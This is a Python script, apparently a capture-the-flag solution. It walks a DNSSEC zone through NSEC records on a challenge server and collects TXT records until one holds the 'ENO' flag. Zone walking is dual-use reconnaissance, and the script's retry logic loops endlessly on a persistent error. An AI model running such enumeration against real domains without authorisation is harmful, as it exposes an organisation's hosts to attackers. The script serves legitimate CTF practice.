#!/usr/bin/env python3
import subprocess
import json
import sys
import time

SERVER = "52.59.124.14"
PORT = "5052"
START_DOMAIN = "dinos.nullcon.net"

current = START_DOMAIN
visited = set([current])
data = {}

print(f"Walking from {current}...")

# No loop limit, run until wrap
count = 0
while True:
    try:
        cmd = ["dig", f"@{SERVER}", "-p", PORT, "+short", "NSEC", current]
        output = subprocess.check_output(cmd, timeout=10).decode('utf-8').strip()
    except Exception as e:
        print(f"Error at {current}: {e}")
        time.sleep(1) # Backoff
        continue # Retry logic needed? Or just skip? 
        # Actually jumping to next might be impossible without knowing next.
        # Let's retry 3 times.
        
    if not output:
        print(f"No NSEC for {current}")
        break
        
    parts = output.split()
    next_domain = parts[0].rstrip('.')
    
    if next_domain == START_DOMAIN:
        print("Wrapped around to start!")
        break
        
    if next_domain in visited:
        print(f"Loop at {next_domain}")
        break
        
    # Get TXT
    txt_val = ""
    try:
        txt_cmd = ["dig", f"@{SERVER}", "-p", PORT, "+short", "TXT", next_domain]
        txt = subprocess.check_output(txt_cmd, timeout=5).decode('utf-8').strip()
        # Remove quotes
        txt_val = txt.replace('"', '')
        data[next_domain] = txt_val
        
        if "ENO" in txt_val:
            print(f"\n!!! FOUND ENO IN {next_domain}: {txt_val}\n")
            with open('FOUND_FLAG.txt', 'w') as f:
                f.write(txt_val)
            break
            
    except:
        pass

    visited.add(next_domain)
    current = next_domain
    count += 1
    
    if count % 10 == 0:
        print(f"Processed {count} domains...", end='\r')
        
    if count > 2000: # Safety
        print("Safety limit reached")
        break

print(f"\nFound {len(data)} records")
with open('dinos_dump.json', 'w') as f:
    json.dump(data, f, indent=2)
